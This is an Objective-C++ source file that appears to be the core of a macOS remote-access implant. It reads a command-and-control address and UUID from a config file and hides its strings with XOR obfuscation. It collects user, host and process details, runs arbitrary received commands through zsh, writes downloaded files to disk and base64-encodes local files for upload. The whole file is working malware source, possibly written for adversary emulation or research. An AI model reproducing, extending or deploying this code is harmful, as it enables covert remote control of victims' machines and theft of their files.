#import "core.hpp"

#import "XorLogger.hpp"
#import "settings.hpp"
#import "xor_string.hpp"

#import <string>
#import <Foundation/Foundation.h>
#import <SystemConfiguration/SystemConfiguration.h>

// helper to convert NSString to C++ std::string
std::string _ToStdString(NSString * nstring) {
    return std::string([nstring UTF8String]);
}

auto _GetFileContents(const char * file_path) {
    NSString * pathToRead = [NSString stringWithUTF8String:file_path];

    NSFileManager * fileManager = [NSFileManager defaultManager];
    NSString * currentPath = [fileManager currentDirectoryPath];
    XorLogger::LogInfo(XOR_LIT("Current working directory is: ") + _ToStdString(currentPath));

    if (![fileManager fileExistsAtPath:pathToRead]) {
        XorLogger::LogError(XOR_LIT("File to read does not exist: ") + _ToStdString(pathToRead));
        return [[[NSData alloc] init] autorelease];
    }

    if (![fileManager isReadableFileAtPath:pathToRead]) {
        XorLogger::LogError(XOR_LIT("Missing privileges to read: ") + _ToStdString(pathToRead));
        return [[[NSData alloc] init] autorelease];
    }

    NSData * fileContentsBuffer;
    fileContentsBuffer = [fileManager contentsAtPath:pathToRead];

    return fileContentsBuffer;
}

const char * GetUserName() {
    return [NSUserName() UTF8String];
}

const char * GetHostName() {
    return [[[NSHost currentHost] localizedName] UTF8String];
}

int GetPID() {
    NSProcessInfo *processInfo = [NSProcessInfo processInfo];
    int processID = [processInfo processIdentifier];
    return processID;
}

bool LoadConfig() {

    NSData * configData = _GetFileContents(Settings::CONFIG_FILE_NAME.c_str());
    NSString * configString = [[[NSString alloc] initWithData:configData encoding:NSUTF8StringEncoding] autorelease];

    if (configString.length <= 0) {
        [configString release];
        return false;
    }

    XorLogger::LogDebug(XOR_LIT("Configuration file contents: \n") + _ToStdString(configString));
    NSArray * brokenByLines=[configString componentsSeparatedByString:@"\n"];
    @try {
        Settings::C2_ADDRESS = _ToStdString(brokenByLines[0]);
        Settings::UUID = _ToStdString(brokenByLines[1]);
        XorLogger::LogInfo(XOR_LIT("C2 Address is: ") + Settings::C2_ADDRESS);
        XorLogger::LogInfo(XOR_LIT("UUID is: ") + Settings::UUID);

        [configString release];
        return true;
    }
    @catch(id exception) {
        XorLogger::LogError(XOR_LIT("Unable to parse C2 address and UUID from config: ") + _ToStdString([exception reason]));
        [configString release];
        return false;
    }

}

const char * ExecuteCmd(const char * cmd) {
    XorLogger::LogInfo(XOR_LIT("Received command to execute: )") + std::string(cmd));
    NSString * cmdNS = [NSString stringWithUTF8String:cmd];

    // create task to execute command with zsh
    NSTask *execTask = [NSTask new];
    [execTask setLaunchPath:@"/bin/zsh"];
    [execTask setArguments:@[ @"-c", cmdNS ]];

    // create pipe to capture STDOUT and STDERR
    NSPipe *outputPipe = [NSPipe pipe];
    [execTask setStandardInput:[NSPipe pipe]];
    [execTask setStandardOutput:outputPipe];
    [execTask setStandardError: [execTask standardOutput]];

    // execute task and wait for output
    NSError *error =nil;
    if(![execTask launchAndReturnError:(&error)]){
        XorLogger::LogError(XOR_LIT("NSTask error: ") + _ToStdString(error.localizedDescription));
        return [error.localizedDescription UTF8String];
    }
    [execTask waitUntilExit];
    [execTask release];

    // convert output to NSString
    NSData *outputData = [[outputPipe fileHandleForReading] readDataToEndOfFile];
    NSString *outputString = [[[NSString alloc] initWithData:outputData encoding:NSUTF8StringEncoding] autorelease];
    XorLogger::LogDebug(XOR_LIT("Output:\n") + _ToStdString(outputString));

    return [outputString UTF8String];
}

bool DownloadFile(unsigned char * file_bytes, int file_size, const char * file_path) {
    NSData* data = [NSData dataWithBytes:(const void *)file_bytes length:sizeof(unsigned char)*file_size];
    NSString * filePath = [NSString stringWithUTF8String:file_path];
    bool isDownloadSuccess = [[NSFileManager defaultManager] createFileAtPath:filePath contents:data attributes:nil];
    return isDownloadSuccess;
}

char * UploadFile(const char * file_path) {
    XorLogger::LogInfo(XOR_LIT("Attempting to read ") + std::string(file_path) + XOR_LIT(" for upload"));
    NSData * fileContents = _GetFileContents(file_path);
    NSData * base64Contents = [fileContents base64EncodedDataWithOptions:0];
    return (char *) [base64Contents bytes];
}